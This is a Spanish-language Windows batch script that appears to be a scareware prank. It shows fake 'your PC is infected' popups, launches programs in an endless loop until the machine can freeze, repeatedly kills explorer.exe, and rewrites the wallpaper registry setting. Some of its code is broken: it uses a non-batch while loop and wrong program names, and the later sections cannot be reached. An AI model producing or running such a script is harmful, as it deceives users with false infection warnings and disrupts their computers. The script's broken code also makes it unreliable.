@echo off
title ¡Advertencia: tu PC está infectada!
mode con: cols=60 lines=10

rem Abre 200 ventanas emergentes de Windows con un mensaje aleatorio
for /l %%n in (1,1,200) do msg * ¡Tu PC está infectada! & timeout /t 2 >nul & cls

rem Abre un bucle de aplicaciones al azar
openloop:
start notepad.exe
start explorer.exe
start cmd.exe
start ms-paint.exe
start calculator.exe
start wordpad.exe
goto openloop

rem Derrite el escritorio
melt:
rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,True ,0
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
goto melt

rem Cambia el fondo de pantalla cada 10 segundos a una imagen absurda
while (true) do {
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%~dp0img.jpg" /f
    rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,True ,0
    timeout /t 10 >nul
}
